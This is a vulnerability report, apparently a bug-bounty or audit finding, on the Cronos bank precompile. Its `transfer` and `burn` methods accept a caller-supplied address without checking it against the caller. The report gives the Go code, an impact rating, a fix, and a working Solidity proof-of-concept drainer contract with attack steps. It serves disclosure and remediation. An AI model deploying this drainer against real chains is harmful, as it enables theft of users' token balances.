### Title
Unauthenticated `sender` in Bank Precompile `transfer` Allows Any Contract to Drain Arbitrary Accounts of Its Own Denom - (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` method of the `BankContract` precompile accepts the `sender` address as a caller-supplied argument and never verifies it equals `contract.Caller()`. Any deployed EVM contract can invoke `bankPrecompile.transfer(victimAddress, attackerAddress, amount)` and move `evm/<callerContract>` tokens out of `victimAddress` without that account's consent.

---

### Finding Description

The bank precompile at address `0x0000000000000000000000000000000000000064` exposes four methods: `mint`, `burn`, `balanceOf`, and `transfer`. The denom operated on is always `EVMDenom(contract.Caller())` = `"evm/" + callerAddress.Hex()`, tying the token namespace to the calling contract's address.

In the `transfer` case the implementation is:

```go
sender    := args[0].(common.Address)   // ← taken from calldata
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())    // evm/<callerContract>
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

`sender` (which becomes `from` in `SendCoins`) is read directly from the ABI-encoded input. There is **no check** that `sender == contract.Caller()`. The only guard present is `checkBlockedAddr(to)`, which only prevents sending to module-blocked addresses. [1](#0-0) 

Compare this with the `mint`/`burn` branch, where the address operated on is also taken from calldata (`recipient := args[0]`) with no caller check — meaning a contract can also burn `evm/<itself>` tokens from any arbitrary address. [2](#0-1) 

---

### Impact Explanation

**Critical — Unauthorized transfer of precompile-controlled assets.**

The `evm/<contract>` denom is a first-class Cosmos native token managed by the bank module. Users accumulate these tokens by calling functions like `moveToNative` on contracts that wrap the bank precompile (e.g., `TestBank.moveToNative` burns ERC-20 and mints the native `evm/<contract>` equivalent). [3](#0-2) 

A malicious contract can:
1. Attract users to hold `evm/<maliciousContract>` tokens (e.g., by offering a yield wrapper or bridge interface).
2. At any time call `bankPrecompile.transfer(victimAddress, attackerAddress, victimBalance)` — transferring the victim's entire native balance to the attacker with no approval or signature from the victim.

The `burn` method has the same flaw: a contract can call `bankPrecompile.burn(victimAddress, amount)` to destroy `evm/<itself>` tokens held by any address.

This satisfies the Critical criterion: *"Unauthorized mint, burn, transfer … or balance/accounting change for … precompile-controlled assets."*

---

### Likelihood Explanation

- The bank precompile is deployed at a fixed, well-known address (`0x…64`) and is callable by any EVM contract with no special privilege.
- Deploying a malicious contract costs only gas; no admin key, governance vote, or validator compromise is required.
- The attack is a single EVM call and can be front-run or batched atomically.

---

### Recommendation

Add a caller-equality check before executing `SendCoins` in the `transfer` branch:

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the caller")
}
```

Apply the same fix to the `burn` branch — verify that the address being burned from equals `contract.Caller()`:

```go
if recipient != contract.Caller() {
    return nil, errors.New("burn: can only burn caller's own tokens")
}
``` [4](#0-3)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
    function balanceOf(address token, address addr) external view returns (uint256);
}

contract BankDrainer {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: attract victim to hold evm/<this> tokens via some legitimate-looking interface
    // (e.g., a yield vault that calls bank.mint on deposit)

    // Step 2: drain victim at any time
    function drain(address victim, address attacker) external {
        // denom = "evm/" + address(this).hex  (determined by contract.Caller() in precompile)
        uint256 bal = bank.balanceOf(address(this), victim);
        // No approval from `victim` required — sender is taken from calldata, not verified
        bank.transfer(victim, attacker, bal);
    }
}
```

1. Deploy `BankDrainer`; its address becomes the denom namespace `evm/0xBankDrainer`.
2. Victim calls a deposit function that internally calls `bank.mint(victim, 1000)` — victim now holds 1000 `evm/0xBankDrainer` native tokens.
3. Attacker calls `BankDrainer.drain(victimAddress, attackerAddress)`.
4. The precompile executes `bankKeeper.SendCoins(ctx, victim, attacker, 1000 evm/0xBankDrainer)` — victim's balance is zero, attacker received 1000 tokens, with no consent from the victim. [5](#0-4)
